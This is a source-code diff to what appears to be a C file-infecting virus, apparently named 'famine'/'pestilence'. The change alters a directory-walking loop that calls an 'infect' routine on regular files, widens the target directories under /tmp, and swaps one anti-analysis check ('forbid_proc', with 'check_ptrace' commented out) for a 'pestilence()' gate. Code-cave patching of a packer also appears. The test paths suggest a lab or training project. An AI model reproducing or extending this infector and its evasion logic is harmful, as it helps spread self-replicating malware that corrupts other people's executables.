@@ -61,7 +61,6 @@ static int packer(t_data *data) {
 
 static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
-	//ft_memset(patch, 0, sizeof(t_patch));
 	t_patch *patch = &data->patch;
 
 	/* calculate the difference between the cave and the packer 
@@ -175,7 +174,6 @@ static int	infect(const char *filename, const char *self_name)
 		return 1;
 	}
 
-	//_syscall(SYS_msync, data.file, data.size, MS_SYNC);
 	free_data(&data);
 
 	return 0;
@@ -206,7 +204,6 @@ static void	open_file(const char *file, const char *self_path, size_t *counter)
 				continue;
 			
 			if (dir->d_type == DT_REG) {
-
 				char new_path[PATH_MAX];
 
 				make_path(new_path, file, dir->d_name);
@@ -230,26 +227,22 @@ static void	open_file(const char *file, const char *self_path, size_t *counter)
 
 void	famine(void)
 {
-	//if (check_ptrace() != 0 || forbid_proc() != 0)
-	//	_syscall(SYS_exit, 1);
-	if (forbid_proc() != 0) {
-		char msg[] = "forbid_proc\n";
-		_syscall(SYS_write, 2, msg, sizeof(msg));
-		_syscall(SYS_exit, 1);
-	}
+	if (pestilence() != 0)
+		return ;
 
 	size_t counter = 0;
 	char host_name[PATH_MAX];
 
+	const char *paths[] = {
+		((char[]){"/tmp/test1"}),
+		((char[]){"/tmp/test2"}),
+		((char[]){"./tmp"}),
+		(void *)0,
+	};
+
 	if (self_name(host_name) != 0) {
 		return ;
 	}
-
-	const char p1[] = "./tmp";
-	const char *paths[] = {
-		p1,
-		(void *)0,
-	};
 
 	for (int i = 0; paths[i]; ++i)
 		open_file(paths[i], host_name, &counter);
